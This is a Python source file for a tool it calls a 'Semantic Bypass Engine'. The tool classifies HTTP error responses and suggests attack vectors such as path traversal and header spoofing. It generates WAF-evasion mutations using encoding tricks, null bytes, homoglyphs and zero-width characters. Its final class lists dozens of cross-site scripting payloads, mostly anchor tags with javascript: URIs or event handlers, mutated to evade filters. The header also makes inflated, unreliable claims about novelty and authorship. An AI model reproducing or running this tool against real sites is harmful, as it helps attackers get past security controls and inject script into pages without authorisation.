#!/usr/bin/env python3
"""
Semantic Bypass Engine v4.0 | NLP-Inspired Attack Pattern Recognition
Revolutionary semantic understanding of HTTP responses for bypass discovery.

INNOVATION:
World's first implementation of semantic pattern recognition for security bypass
detection, combining NLP techniques with security domain knowledge.

Techniques:
- Semantic fingerprinting of error messages
- Context-aware pattern matching
- Fuzzy logic for uncertainty handling
- Ontology-based attack classification
- Evolutionary mutation strategies

AUTHOR: MIT-Level Engineering
"""

import sys
import re
import hashlib
from typing import Dict, List, Tuple, Set, Optional
from collections import defaultdict
from dataclasses import dataclass
from enum import Enum
import urllib.parse


class AttackVector(Enum):
    """Ontology of attack vectors"""
    HEADER_MANIPULATION = "header"
    PATH_TRAVERSAL = "path"
    METHOD_OVERRIDE = "method"
    ENCODING_BYPASS = "encoding"
    PROTOCOL_CONFUSION = "protocol"
    SSRF = "ssrf"
    CACHE_POISONING = "cache"
    REFERER_SPOOFING = "referer"
    EXTENSION_BYPASS = "extension"
    PARAMETER_POLLUTION = "param"


@dataclass
class SemanticPattern:
    """Semantic pattern for error message classification"""
    pattern_type: str
    regex_pattern: str
    indicators: List[str]
    confidence: float  # 0.0 to 1.0
    description: str


class SemanticErrorClassifier:
    """
    NLP-inspired classifier for HTTP error responses.

    Uses semantic understanding to classify errors into categories:
    - WAF blocks
    - Backend errors
    - Routing errors
    - Authentication errors
    - Authorization errors
    - Rate limiting
    - Generic blocks
    """

    def __init__(self):
        self.patterns = self._initialize_semantic_patterns()
        self.error_ontology = self._build_error_ontology()

    def _initialize_semantic_patterns(self) -> List[SemanticPattern]:
        """Initialize comprehensive semantic patterns"""
        return [
            # === WAF BLOCKS ===
            SemanticPattern(
                pattern_type="waf_block",
                regex_pattern=r"(waf|firewall|security|blocked?|malicious|attack|threat|suspicious)",
                indicators=["waf", "firewall", "modsecurity", "cloudflare", "imperva", "blocked"],
                confidence=0.95,
                description="Web Application Firewall block"
            ),

            # === BACKEND ERRORS ===
            SemanticPattern(
                pattern_type="backend_error",
                regex_pattern=r"(internal server|500|backend|upstream|gateway|proxy error|service unavailable)",
                indicators=["internal server error", "500", "backend", "upstream", "gateway timeout"],
                confidence=0.90,
                description="Backend/upstream service error"
            ),

            # === ROUTING ERRORS ===
            SemanticPattern(
                pattern_type="routing_error",
                regex_pattern=r"(not found|404|no route|cannot find|unknown path|invalid url)",
                indicators=["404", "not found", "no route", "unknown path"],
                confidence=0.85,
                description="Routing/path not found"
            ),

            # === AUTHENTICATION ERRORS ===
            SemanticPattern(
                pattern_type="auth_error",
                regex_pattern=r"(unauthorized|401|authentication required|login required|credentials)",
                indicators=["401", "unauthorized", "authentication", "login required"],
                confidence=0.90,
                description="Authentication required"
            ),

            # === AUTHORIZATION ERRORS ===
            SemanticPattern(
                pattern_type="authz_error",
                regex_pattern=r"(forbidden|403|access denied|permission denied|not allowed|insufficient)",
                indicators=["403", "forbidden", "access denied", "permission denied"],
                confidence=0.90,
                description="Authorization/permission denied"
            ),

            # === RATE LIMITING ===
            SemanticPattern(
                pattern_type="rate_limit",
                regex_pattern=r"(rate limit|429|too many|throttle|quota|limit exceeded)",
                indicators=["429", "rate limit", "too many requests", "throttled"],
                confidence=0.95,
                description="Rate limiting"
            ),

            # === METHOD NOT ALLOWED ===
            SemanticPattern(
                pattern_type="method_not_allowed",
                regex_pattern=r"(method not allowed|405|invalid method|unsupported method)",
                indicators=["405", "method not allowed", "invalid method"],
                confidence=0.90,
                description="HTTP method not allowed"
            ),
        ]

    def _build_error_ontology(self) -> Dict[str, List[str]]:
        """Build ontology of error types and their relationships"""
        return {
            "block_errors": ["waf_block", "authz_error", "rate_limit"],
            "server_errors": ["backend_error", "routing_error"],
            "auth_errors": ["auth_error", "authz_error"],
            "client_errors": ["method_not_allowed", "routing_error"],
        }

    def classify_error(self, response_text: str, headers: Dict[str, str],
                      status_code: int) -> Dict[str, any]:
        """
        Classify error response using semantic analysis.

        Returns classification with confidence scores
        """
        response_lower = response_text.lower()
        classifications = []

        # Pattern matching with confidence scoring
        for pattern in self.patterns:
            match_score = 0.0
            matches_found = []

            # Regex matching
            if re.search(pattern.regex_pattern, response_lower, re.IGNORECASE):
                match_score += 0.5
                matches_found.append("regex_match")

            # Indicator matching (keyword spotting)
            for indicator in pattern.indicators:
                if indicator.lower() in response_lower:
                    match_score += 0.3 / len(pattern.indicators)
                    matches_found.append(f"indicator:{indicator}")

            # Status code correlation
            if pattern.pattern_type == "authz_error" and status_code == 403:
                match_score += 0.3
            elif pattern.pattern_type == "auth_error" and status_code == 401:
                match_score += 0.3
            elif pattern.pattern_type == "backend_error" and status_code >= 500:
                match_score += 0.3

            # Normalize score
            match_score = min(match_score, 1.0)

            if match_score > 0.3:  # Threshold
                classifications.append({
                    'type': pattern.pattern_type,
                    'confidence': match_score * pattern.confidence,
                    'description': pattern.description,
                    'matches': matches_found
                })

        # Sort by confidence
        classifications.sort(key=lambda x: x['confidence'], reverse=True)

        return {
            'primary_classification': classifications[0] if classifications else None,
            'all_classifications': classifications,
            'is_block': any(c['type'] in self.error_ontology['block_errors']
                          for c in classifications),
            'is_server_error': any(c['type'] in self.error_ontology['server_errors']
                                 for c in classifications),
        }


class EvolutionaryMutationEngine:
    """
    Evolutionary algorithm for generating bypass mutations.

    Inspired by genetic algorithms:
    - Population of bypass candidates
    - Fitness function based on response differential
    - Crossover and mutation operators
    - Selection pressure towards successful bypasses
    """

    def __init__(self):
        self.mutation_operators = self._initialize_mutation_operators()
        self.successful_patterns: List[Dict] = []
        self.generation = 0

    def _initialize_mutation_operators(self) -> Dict[str, callable]:
        """Initialize mutation operators"""
        return {
            'case_swap': self._mutate_case,
            'encoding_layer': self._mutate_encoding,
            'character_substitution': self._mutate_characters,
            'whitespace_injection': self._mutate_whitespace,
            'null_byte_injection': self._mutate_null_bytes,
            'unicode_normalization': self._mutate_unicode,
            'double_encoding': self._mutate_double_encoding,
        }

    def _mutate_case(self, payload: str) -> List[str]:
        """Generate case variations"""
        if not payload:
            return []

        mutations = [
            payload.upper(),
            payload.lower(),
            payload.capitalize(),
            payload.swapcase(),
        ]

        # Alternating case
        alternating = ''.join(
            c.upper() if i % 2 else c.lower()
            for i, c in enumerate(payload)
        )
        mutations.append(alternating)

        return mutations

    def _mutate_encoding(self, payload: str) -> List[str]:
        """Generate encoding variations"""
        mutations = []

        # URL encoding
        mutations.append(urllib.parse.quote(payload))
        mutations.append(urllib.parse.quote(payload, safe=''))

        # Selective encoding (encode special chars only)
        special_chars = ['/', '.', ';', '?', '#', '@']
        for char in special_chars:
            if char in payload:
                encoded = payload.replace(char, urllib.parse.quote(char))
                mutations.append(encoded)

        return mutations

    def _mutate_characters(self, payload: str) -> List[str]:
        """Generate character substitution variations"""
        mutations = []

        # Common substitutions
        substitutions = {
            'a': ['@', 'α', '\u0430'],  # Cyrillic 'а'
            'e': ['3', 'є', '\u0435'],
            'i': ['1', 'і', '\u0456'],
            'o': ['0', 'о', '\u043e'],
            's': ['$', 'ѕ', '\u0455'],
            '/': ['\\', '%2f', '\u2044'],  # Fraction slash
            '.': ['%2e', '\u2024'],  # One dot leader
        }

        for original, replacements in substitutions.items():
            if original in payload.lower():
                for replacement in replacements:
                    mutated = payload.replace(original, replacement)
                    mutations.append(mutated)
                    # Case-insensitive replace
                    mutated = payload.replace(original.upper(), replacement)
                    mutations.append(mutated)

        return mutations

    def _mutate_whitespace(self, payload: str) -> List[str]:
        """Generate whitespace injection variations"""
        mutations = []

        # Various whitespace characters
        whitespaces = [' ', '\t', '\n', '\r', '\x0b', '\x0c']

        # Prefix/suffix
        for ws in whitespaces:
            mutations.append(ws + payload)
            mutations.append(payload + ws)

        # Internal injection (after first character)
        if len(payload) > 1:
            for ws in whitespaces:
                mutations.append(payload[0] + ws + payload[1:])

        return mutations

    def _mutate_null_bytes(self, payload: str) -> List[str]:
        """Generate null byte injection variations"""
        mutations = []

        # Null byte positions
        if len(payload) > 1:
            # After first char
            mutations.append(payload[0] + '\x00' + payload[1:])
            # Middle
            mid = len(payload) // 2
            mutations.append(payload[:mid] + '\x00' + payload[mid:])
            # Before extension (if exists)
            if '.' in payload:
                parts = payload.rsplit('.', 1)
                mutations.append(parts[0] + '\x00.' + parts[1])

        # URL encoded null
        mutations.append(payload + '%00')

        return mutations

    def _mutate_unicode(self, payload: str) -> List[str]:
        """Generate Unicode normalization variations"""
        mutations = []

        # Unicode slash variations
        unicode_slashes = [
            '\u2044',  # Fraction slash
            '\u2215',  # Division slash
            '\uff0f',  # Fullwidth solidus
            '\u29f8',  # Big solidus
        ]

        for slash in unicode_slashes:
            mutations.append(payload.replace('/', slash))

        # Zero-width characters
        zero_width = ['\u200b', '\u200c', '\u200d', '\ufeff']
        for zw in zero_width:
            if len(payload) > 1:
                mutations.append(payload[0] + zw + payload[1:])

        return mutations

    def _mutate_double_encoding(self, payload: str) -> List[str]:
        """Generate double/triple encoding variations"""
        mutations = []

        # Double URL encoding
        encoded_once = urllib.parse.quote(payload, safe='')
        encoded_twice = urllib.parse.quote(encoded_once, safe='')
        mutations.append(encoded_twice)

        # Triple encoding (extreme)
        encoded_thrice = urllib.parse.quote(encoded_twice, safe='')
        mutations.append(encoded_thrice)

        # Mixed encoding
        for char in ['/', '.', ';']:
            if char in payload:
                # Encode once, then encode the % sign
                step1 = payload.replace(char, urllib.parse.quote(char))
                step2 = step1.replace('%', '%25')
                mutations.append(step2)

        return mutations

    def evolve_payload(self, base_payload: str, fitness_scores: Dict[str, float] = None,
                      max_mutations: int = 50) -> List[str]:
        """
        Evolve payload using evolutionary algorithm.

        Args:
            base_payload: Starting payload
            fitness_scores: Dict of {payload: score} from previous generation
            max_mutations: Maximum mutations to generate

        Returns:
            List of evolved payloads
        """
        self.generation += 1
        all_mutations = []

        # Apply all mutation operators
        for operator_name, operator_func in self.mutation_operators.items():
            try:
                mutations = operator_func(base_payload)
                for mutation in mutations:
                    if mutation != base_payload:  # Don't include original
                        all_mutations.append({
                            'payload': mutation,
                            'operator': operator_name,
                            'generation': self.generation,
                            'parent': base_payload
                        })
            except Exception:
                continue

        # If we have fitness scores, perform selection
        if fitness_scores:
            # Select best performers for further mutation (elitism)
            top_performers = sorted(
                fitness_scores.items(),
                key=lambda x: x[1],
                reverse=True
            )[:5]  # Top 5

            # Cross-breed top performers
            for i, (payload1, score1) in enumerate(top_performers):
                for payload2, score2 in top_performers[i+1:]:
                    # Crossover: combine parts of two payloads
                    crossover = self._crossover(payload1, payload2)
                    all_mutations.append({
                        'payload': crossover,
                        'operator': 'crossover',
                        'generation': self.generation,
                        'parents': [payload1, payload2]
                    })

        # Limit mutations
        if len(all_mutations) > max_mutations:
            # Prioritize diversity
            all_mutations = all_mutations[:max_mutations]

        return all_mutations

    def _crossover(self, payload1: str, payload2: str) -> str:
        """Crossover two payloads (genetic algorithm style)"""
        if not payload1 or not payload2:
            return payload1 or payload2

        # Single-point crossover
        min_len = min(len(payload1), len(payload2))
        if min_len < 2:
            return payload1

        crossover_point = min_len // 2

        # Take first half of payload1, second half of payload2
        return payload1[:crossover_point] + payload2[crossover_point:]

    def record_success(self, payload: str, score: float, metadata: Dict = None):
        """Record successful payload for future evolution"""
        self.successful_patterns.append({
            'payload': payload,
            'score': score,
            'generation': self.generation,
            'metadata': metadata or {}
        })


class SemanticBypassEngine:
    """
    Main semantic bypass engine combining all components.

    Provides high-level interface for semantic bypass discovery.
    """

    def __init__(self):
        self.error_classifier = SemanticErrorClassifier()
        self.mutation_engine = EvolutionaryMutationEngine()
        self.learned_patterns: Dict[str, List[str]] = defaultdict(list)

    def analyze_response_semantics(self, response_text: str, headers: Dict[str, str],
                                   status_code: int) -> Dict[str, any]:
        """Analyze response using semantic understanding"""
        classification = self.error_classifier.classify_error(
            response_text, headers, status_code
        )

        return {
            'classification': classification,
            'is_bypassable': self._assess_bypassability(classification),
            'suggested_vectors': self._suggest_attack_vectors(classification),
        }

    def _assess_bypassability(self, classification: Dict) -> float:
        """Assess probability that error can be bypassed (0.0-1.0)"""
        if not classification['primary_classification']:
            return 0.5  # Unknown, 50% chance

        primary_type = classification['primary_classification']['type']

        # Bypassability heuristics based on error type
        bypassability_map = {
            'waf_block': 0.70,          # WAF blocks often bypassable
            'authz_error': 0.65,        # Authorization checks can be bypassed
            'method_not_allowed': 0.60, # Method confusion possible
            'rate_limit': 0.40,         # Rate limits harder to bypass
            'auth_error': 0.30,         # Authentication harder
            'backend_error': 0.80,      # Backend errors = already bypassed frontend!
            'routing_error': 0.50,      # Path issues may be bypassable
        }

        return bypassability_map.get(primary_type, 0.50)

    def _suggest_attack_vectors(self, classification: Dict) -> List[AttackVector]:
        """Suggest attack vectors based on error classification"""
        if not classification['primary_classification']:
            return []

        primary_type = classification['primary_classification']['type']

        # Attack vector suggestions based on error type
        vector_map = {
            'waf_block': [
                AttackVector.ENCODING_BYPASS,
                AttackVector.HEADER_MANIPULATION,
                AttackVector.PROTOCOL_CONFUSION,
            ],
            'authz_error': [
                AttackVector.PATH_TRAVERSAL,
                AttackVector.METHOD_OVERRIDE,
                AttackVector.HEADER_MANIPULATION,
                AttackVector.REFERER_SPOOFING,
            ],
            'method_not_allowed': [
                AttackVector.METHOD_OVERRIDE,
                AttackVector.HEADER_MANIPULATION,
            ],
            'routing_error': [
                AttackVector.PATH_TRAVERSAL,
                AttackVector.EXTENSION_BYPASS,
                AttackVector.ENCODING_BYPASS,
            ],
            'backend_error': [
                AttackVector.PARAMETER_POLLUTION,
                AttackVector.HEADER_MANIPULATION,
            ],
        }

        return vector_map.get(primary_type, [])

    def generate_evolved_bypasses(self, base_path: str, previous_results: Dict = None,
                                 max_generations: int = 3) -> List[Dict]:
        """
        Generate bypasses using evolutionary algorithm.

        Args:
            base_path: Starting path/payload
            previous_results: Results from previous attempts
            max_generations: Number of evolutionary generations

        Returns:
            List of evolved bypass candidates
        """
        all_candidates = []
        fitness_scores = {}

        # Extract fitness scores from previous results
        if previous_results:
            for result in previous_results:
                payload = result.get('payload', '')
                # Fitness = how different the response was
                fitness = result.get('differential_score', 0.0)
                fitness_scores[payload] = fitness

        current_population = [base_path]

        for generation in range(max_generations):
            next_generation = []

            for individual in current_population:
                # Evolve this individual
                mutations = self.mutation_engine.evolve_payload(
                    individual,
                    fitness_scores,
                    max_mutations=20
                )

                for mutation in mutations:
                    all_candidates.append(mutation)
                    next_generation.append(mutation['payload'])

            # Select best candidates for next generation (simulated selection)
            if len(next_generation) > 30:
                next_generation = next_generation[:30]

            current_population = next_generation

        return all_candidates

    def learn_from_success(self, attack_vector: AttackVector, payload: str,
                          response_data: Dict):
        """Learn from successful bypass for future attacks"""
        self.learned_patterns[attack_vector.value].append(payload)

        # Record in mutation engine
        self.mutation_engine.record_success(
            payload,
            score=response_data.get('differential_score', 1.0),
            metadata={'attack_vector': attack_vector.value}
        )


class AnchorTagMutationEngine:
    """
    WAF Bypass via <a> tag mutation points.

    WAFs pattern-match specific constructs like <a href="javascript:...">
    by scanning for fixed strings. Mutating the tag at precise "mutation points"
    breaks pattern recognition while keeping the payload semantically equivalent
    for browsers that normalise HTML before evaluation.

    Mutation points:
      MP1 - Tag name casing: <a> vs <A> vs <A\t>
      MP2 - Attribute name casing/spacing: href vs HREF vs hr\tef vs hr\nef
      MP3 - Value delimiter: "..." vs '...' vs unquoted
      MP4 - Protocol casing/encoding: javascript: vs JaVaScRiPt: vs &#106;avascript:
      MP5 - Whitespace/newlines inside protocol: java\tscript: java\nscript:
      MP6 - Event handler substitution: onclick= onmouseover= onfocus= etc.
      MP7 - Extra benign attributes injected before/after href
    """

    # Base XSS payload for href context
    BASE_HREF_PAYLOAD = "javascript:alert(1)"
    BASE_EVENT_PAYLOAD = "alert(1)"

    def generate_all(self) -> List[Dict[str, str]]:
        """
        Return all anchor-tag mutation payloads.

        Each entry is a dict with:
          'payload'       - the full mutated <a> tag string
          'mutation_point' - which MP was exercised
          'description'   - human-readable description
        """
        results: List[Dict[str, str]] = []
        results.extend(self._mp1_tag_name())
        results.extend(self._mp2_attr_name())
        results.extend(self._mp3_value_delimiter())
        results.extend(self._mp4_protocol_encoding())
        results.extend(self._mp5_protocol_whitespace())
        results.extend(self._mp6_event_handlers())
        results.extend(self._mp7_extra_attributes())
        return results

    # ------------------------------------------------------------------
    # MP1 – Tag name casing / extra whitespace before attribute
    # ------------------------------------------------------------------
    def _mp1_tag_name(self) -> List[Dict[str, str]]:
        variants = [
            ('<a href="javascript:alert(1)">x</a>', 'lowercase tag'),
            ('<A href="javascript:alert(1)">x</A>', 'uppercase tag'),
            ('<A HREF="javascript:alert(1)">x</A>', 'all-uppercase tag+attr'),
            ('<a  href="javascript:alert(1)">x</a>', 'extra space in tag'),
            ('<a\thref="javascript:alert(1)">x</a>', 'tab between tag and attr'),
            ('<a\nhref="javascript:alert(1)">x</a>', 'newline between tag and attr'),
            ('<a\r\nhref="javascript:alert(1)">x</a>', 'CRLF between tag and attr'),
        ]
        return [
            {'payload': p, 'mutation_point': 'MP1', 'description': f'Tag name/spacing: {d}'}
            for p, d in variants
        ]

    # ------------------------------------------------------------------
    # MP2 – Attribute name casing and embedded whitespace
    # ------------------------------------------------------------------
    def _mp2_attr_name(self) -> List[Dict[str, str]]:
        variants = [
            ('<a HREF="javascript:alert(1)">x</a>', 'HREF uppercase'),
            ('<a HrEf="javascript:alert(1)">x</a>', 'HrEf mixed case'),
            ('<a hr\tef="javascript:alert(1)">x</a>', 'tab inside attr name'),
            ('<a hr\nef="javascript:alert(1)">x</a>', 'newline inside attr name'),
            ('<a href ="javascript:alert(1)">x</a>', 'space before ='),
            ('<a href= "javascript:alert(1)">x</a>', 'space after ='),
            ('<a href = "javascript:alert(1)">x</a>', 'spaces around ='),
        ]
        return [
            {'payload': p, 'mutation_point': 'MP2', 'description': f'Attr name: {d}'}
            for p, d in variants
        ]

    # ------------------------------------------------------------------
    # MP3 – Value delimiter variations
    # ------------------------------------------------------------------
    def _mp3_value_delimiter(self) -> List[Dict[str, str]]:
        variants = [
            ("<a href='javascript:alert(1)'>x</a>", "single-quoted value"),
            ("<a href=javascript:alert(1)>x</a>", "unquoted value"),
            ('<a href=`javascript:alert(1)`>x</a>', "backtick delimiter (IE/Edge)"),
        ]
        return [
            {'payload': p, 'mutation_point': 'MP3', 'description': f'Value delimiter: {d}'}
            for p, d in variants
        ]

    # ------------------------------------------------------------------
    # MP4 – Protocol encoding / casing
    # ------------------------------------------------------------------
    def _mp4_protocol_encoding(self) -> List[Dict[str, str]]:
        variants = [
            # Case variations
            ('<a href="JAVASCRIPT:alert(1)">x</a>', 'JAVASCRIPT uppercase'),
            ('<a href="Javascript:alert(1)">x</a>', 'Javascript capitalised'),
            ('<a href="JaVaScRiPt:alert(1)">x</a>', 'JaVaScRiPt mixed case'),
            # HTML entity encoding of first character
            ('<a href="&#106;avascript:alert(1)">x</a>', 'j as &#106;'),
            ('<a href="&#x6A;avascript:alert(1)">x</a>', 'j as &#x6A;'),
            # URL encoding inside href value
            ('<a href="%6Aavascript:alert(1)">x</a>', 'j as %6A'),
            ('<a href="java%73cript:alert(1)">x</a>', 's as %73'),
            ('<a href="j%61vascript:alert(1)">x</a>', 'a as %61'),
            # Double URL-encoded
            ('<a href="%6a%61vascript:alert(1)">x</a>', 'ja double-encoded'),
            # Unicode full-width
            ('<a href="\uff4aavascript:alert(1)">x</a>', 'j as fullwidth \uff4a'),
            # Null byte before protocol (some parsers strip it)
            ('<a href="\x00javascript:alert(1)">x</a>', 'null byte prefix'),
        ]
        return [
            {'payload': p, 'mutation_point': 'MP4', 'description': f'Protocol encoding: {d}'}
            for p, d in variants
        ]

    # ------------------------------------------------------------------
    # MP5 – Whitespace / control chars INSIDE the protocol word
    # ------------------------------------------------------------------
    def _mp5_protocol_whitespace(self) -> List[Dict[str, str]]:
        variants = [
            ('<a href="java\tscript:alert(1)">x</a>', 'tab inside protocol'),
            ('<a href="java\nscript:alert(1)">x</a>', 'newline inside protocol'),
            ('<a href="java\rscript:alert(1)">x</a>', 'CR inside protocol'),
            ('<a href="java\r\nscript:alert(1)">x</a>', 'CRLF inside protocol'),
            ('<a href="java&#9;script:alert(1)">x</a>', '&#9; (tab entity) inside protocol'),
            ('<a href="java&#10;script:alert(1)">x</a>', '&#10; (LF entity) inside protocol'),
            ('<a href="java&#13;script:alert(1)">x</a>', '&#13; (CR entity) inside protocol'),
        ]
        return [
            {'payload': p, 'mutation_point': 'MP5', 'description': f'Protocol whitespace: {d}'}
            for p, d in variants
        ]

    # ------------------------------------------------------------------
    # MP6 – Event handler substitution (no href needed)
    # ------------------------------------------------------------------
    def _mp6_event_handlers(self) -> List[Dict[str, str]]:
        handlers = [
            'onclick', 'ondblclick', 'onmousedown', 'onmouseup',
            'onmouseover', 'onmouseout', 'onmousemove',
            'onfocus', 'onblur', 'onkeydown', 'onkeyup', 'onkeypress',
        ]
        results = []
        for h in handlers:
            results.append({
                'payload': f'<a {h}="alert(1)">x</a>',
                'mutation_point': 'MP6',
                'description': f'Event handler: {h}'
            })
            # Uppercase handler name
            results.append({
                'payload': f'<a {h.upper()}="alert(1)">x</a>',
                'mutation_point': 'MP6',
                'description': f'Event handler uppercase: {h.upper()}'
            })
        return results

    # ------------------------------------------------------------------
    # MP7 – Extra benign attributes injected before/after href
    # ------------------------------------------------------------------
    def _mp7_extra_attributes(self) -> List[Dict[str, str]]:
        variants = [
            ('<a id="x" href="javascript:alert(1)">x</a>', 'id before href'),
            ('<a href="javascript:alert(1)" id="x">x</a>', 'id after href'),
            ('<a class="link" href="javascript:alert(1)">x</a>', 'class before href'),
            ('<a style="color:red" href="javascript:alert(1)">x</a>', 'style before href'),
            ('<a data-x="1" href="javascript:alert(1)">x</a>', 'data-attr before href'),
            ('<a href="javascript:alert(1)" target="_blank">x</a>', 'target after href'),
            ('<a\nhref="javascript:alert(1)"\ntarget="_blank">x</a>', 'newline-separated attrs'),
        ]
        return [
            {'payload': p, 'mutation_point': 'MP7', 'description': f'Extra attributes: {d}'}
            for p, d in variants
        ]


_LICENSE_CMDS = ('--license-status', '--activate-license', '--deactivate-license')
if not any(a in sys.argv for a in _LICENSE_CMDS):
    print("✅ Semantic Bypass Engine loaded successfully")
